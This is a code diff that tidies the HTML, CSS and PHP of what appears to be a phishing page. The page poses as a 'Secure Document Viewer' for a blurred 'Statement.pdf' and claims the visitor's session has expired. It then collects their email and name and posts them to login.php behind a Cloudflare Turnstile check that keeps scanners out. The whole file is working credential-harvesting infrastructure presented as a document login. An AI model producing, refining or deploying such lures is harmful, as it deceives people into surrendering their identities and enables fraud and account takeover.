@@ -6,211 +6,129 @@
 <title>Secure Document Viewer</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<!-- Cloudflare Turnstile JS -->
+<!-- Cloudflare Turnstile -->
 <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
 <style>
-        /* Global reset / basics */
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+* { box-sizing: border-box; margin: 0; padding: 0; }
 
-        body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            background-color: #111;
-            color: #222;
-            min-height: 100vh;
-        }
+body {
+    font-family: system-ui, sans-serif;
+    background: #111;
+    color: #222;
+    min-height: 100vh;
+}
 
-        /* Layout wrapper */
-        .page-wrapper {
-            position: relative;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-        }
-
-        /* Background "PDF" */
-        .doc-background {
-            position: absolute;
-            inset: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            filter: blur(6px);
-            transform: scale(1.02);
-            opacity: 0.7;
-        }
-
-        .doc-background img {
-            max-width: 100%;
-            max-height: 100vh;
-            object-fit: contain;
-        }
-
-        /* Dark overlay */
-        .page-wrapper::before {
-            content: "";
-            position: absolute;
-            inset: 0;
-            background: radial-gradient(circle at center, rgba(0,0,0,0.1), rgba(0,0,0,0.7));
-            pointer-events: none;
-        }
-
-        /* Login card */
-        .login-card {
-            position: relative;
-            z-index: 2;
-            width: 45%;
-            max-width: 320px;
-            background: #f5f5f5;
-            border-radius: 3px;
-            padding: 18px 26px 26px;
-            box-shadow:
-                0 20px 40px rgba(0, 0, 0, 0.35),
-                0 0 0 1px rgba(0, 0, 0, 0.05);
-        }
-
-        /* PDF icon */
-       .doc-icon {
-    width: 40px;       /* adjust width */
-    height: 40px;      /* adjust height */
-    border-radius: 8px;
-    background: #; /* fallback color if image doesn't load */
+.page-wrapper {
+    position: relative;
+    min-height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
-    margin: 0 auto 8px;
-    overflow: hidden;  /* ensures image stays inside */
+    overflow: hidden;
 }
 
-.doc-icon-img {
-    max-width: 100%;    /* image fits nicely inside icon */
-    max-height: 100%;
+.doc-background {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    filter: blur(6px);
+    transform: scale(1.02);
+    opacity: 0.7;
+}
+
+.doc-background img {
+    max-width: 100%;
+    max-height: 100vh;
     object-fit: contain;
+}
 
-        }
+.page-wrapper::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(circle, rgba(0,0,0,0.15), rgba(0,0,0,0.7));
+}
 
-        .doc-icon-pdf {
-            font-weight: 700;
-            color: #fff;
-            font-size: 10px;
-        }
+.login-card {
+    position: relative;
+    z-index: 2;
+    width: 90%;
+    max-width: 330px;
+    background: #f5f5f5;
+    padding: 20px 26px;
+    border-radius: 6px;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.35);
+}
 
-        /* Titles */
-        .doc-title {
-            font-size: 15px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 6px;
-        }
+.doc-icon {
+    width: 40px;
+    height: 40px;
+    margin: 0 auto 10px;
+    overflow: hidden;
+}
 
-        .doc-size {
-            font-weight: 400;
-            color: #666;
-            font-size: 11px;
-        }
+.doc-icon img { width: 100%; height: 100%; object-fit: contain; }
 
-        .doc-subtitle {
-            font-size: 11px;
-            color: #666;
-            text-align: center;
-            margin-bottom: 8px;
-        }
+.doc-title {
+    font-size: 15px;
+    font-weight: 600;
+    text-align: center;
+}
+.doc-size { font-size: 11px; color: #666; }
 
-        .doc-note {
-            font-size: 0px;
-            color: #999;
-            text-align: center;
-            margin-bottom: 18px;
-        }
+.doc-subtitle {
+    margin-top: 6px;
+    text-align: center;
+    font-size: 11px;
+    color: #666;
+}
 
-        /* Error message */
-        .login-error {
-            color: #c21515;
-            font-size: 10px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 14px;
-        }
+.login-error {
+    margin-top: 10px;
+    color: red;
+    text-align: center;
+    font-size: 12px;
+}
 
-        /* Form */
-        .login-form {
-            display: flex;
-            flex-direction: column;
-            gap: px;
-        }
+.field-wrapper { margin: 12px 0; }
 
-        .field-label {
-            font-size: 0px;
-            font-weight: 500;
-            color: #555;
-            margin-bottom: 15px;
-        }
+input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+}
 
-        .field-wrapper input {
-            width: 100%;
-            padding: 10px 11px;
-            border-radius: 3px;
-            border: 1px solid #d0d0d0;
-            font-size: 14px;
-            outline: none;
-            transition: border-color 0.15s ease, box-shadow 0.15s ease;
-        }
+.btn-primary {
+    width: 100%;
+    margin-top: 12px;
+    padding: 11px;
+    border: none;
+    background: #1a73e8;
+    color: #fff;
+    font-size: 15px;
+    border-radius: 4px;
+}
 
-        .field-wrapper input:focus {
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 1px rgba(26, 115, 232, 0.2);
-        }
-
-        /* Primary button */
-        .btn-primary {
-            margin-top: 10px;
-            width: 100%;
-            padding: 11px 12px;
-          
-            border: none;
-            background: #1a73e8;
-            color: #fff;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            border-radius: 4px;
-            transition: background 0.15s ease, box-shadow 0.15s ease, transform 0.05s ease;
-        }
-
-        .btn-primary:hover {
-            background: #185abc;
-            box-shadow: 0 3px 10px rgba(26, 115, 232, 0.4);
-        }
-
-        .btn-primary:active {
-            transform: translateY(1px);
-        }
-
-        @media (max-width: 480px) {
-            .login-card {
-                padding: 22px 18px 18px;
-                border-radius: 4px;
-            }
-            .doc-title { font-size: 16px; }
-            
-            
-            
-
-        }
-    </style>
+.cf-turnstile {
+    margin-bottom: 6px !important;
+    transform: scale(0.90);
+    transform-origin: 0 0;
+}
+</style>
 </head>
 <body>
+
 <div class="page-wrapper">
     <div class="doc-background">
-        <img src="assets/background.png" alt="Document preview">
+        <img src="assets/background.png">
     </div>
 
     <div class="login-card">
-        <div class="doc-icon">
-            <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
-        </div>
+        <div class="doc-icon"><img src="assets/PDtrans.png"></div>
 
         <h2 class="doc-title">Statement.pdf <span class="doc-size">(197 KB)</span></h2>
         <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
@@ -219,27 +137,28 @@
             <p class="login-error"><?= $_SESSION['error_message']; unset($_SESSION['error_message']); ?></p>
         <?php endif; ?>
 
-        <form class="login-form" method="POST" action="login.php" autocomplete="off">
-            <!-- Turnstile widget -->
+        <form method="POST" action="login.php">
+
+            <!-- Turnstile -->
+            <div class="cf-turnstile"
+                 data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"
+                 data-theme="light"></div>
+
             <div class="field-wrapper">
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
+                <input type="email" name="email"
+                    value="<?= isset($_SESSION['old_email']) ? htmlspecialchars($_SESSION['old_email']) : '' ?>"
+                    placeholder="Enter your email" required>
             </div>
 
-            <label class="field-label" for="email"></label>
             <div class="field-wrapper">
-                <input id="email" name="email" type="email"
-                       value="<?= isset($_SESSION['old_email']) ? htmlspecialchars($_SESSION['old_email']) : '' ?>"
-                       placeholder="Enter your email" required>
+                <input type="text" name="name" placeholder="Enter your name" required>
             </div>
 
-            <label class="field-label" for="name">Name</label>
-            <div class="field-wrapper">
-                <input id="name" name="name" type="text" placeholder="Enter your name" required>
-            </div>
-
-            <button type="submit" class="btn-primary">Next</button>
+            <button class="btn-primary">Next</button>
         </form>
+
     </div>
 </div>
+
 </body>
 </html>
